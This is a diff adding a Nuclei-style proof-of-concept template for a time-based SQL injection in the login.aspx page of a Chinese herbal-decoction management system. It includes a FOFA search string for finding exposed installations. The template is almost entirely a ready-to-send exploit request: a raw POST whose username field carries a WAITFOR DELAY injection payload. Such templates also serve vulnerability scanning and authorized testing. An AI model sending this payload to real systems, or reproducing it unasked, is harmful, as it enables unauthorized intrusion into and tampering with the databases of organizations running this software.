@@ -1,0 +1,42 @@
+id: poc-pup1b0fiilaolz9u
+info:
+  name: 东华原煎药管理系统 login.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pup1b0fiilaolz9u'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pup1b0fiilaolz9u
+    fofa: app="北京东华原煎药管理系统"
+http:
+- raw:
+  - 'POST /login.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: ASP.NET_SessionId=qowootsbthgq0qghakgpkxqb
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    Content-Length: 316
+
+
+    __VIEWSTATE=%2FwEPDwUKLTUwOTQ0NDQ3MWRk5giHO8X2jpZxiHEHQ9uVOA9Eypf30XmTxFb7hjjUaLY%3D&__EVENTVALIDATION=%2FwEdAAQ%2F3WSTSkohBZOLzmy%2FWshxY3plgk0YBAefRz3MyBlTcE5Fo5u8Nmrtdka2GVrCes2inihG6d%2FXh3PZm3b5AoMQ%2B991E8ydMX%2Bj2%2BZsAzXdcmPtd%2BEvhZf7Bll1aAmGtMw%3D&txtUserName='';WAITFOR+DELAY+''0:0:5''--&txtUserPwd=%27&btnLogin=%E7%99%BB%E5%BD%95'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
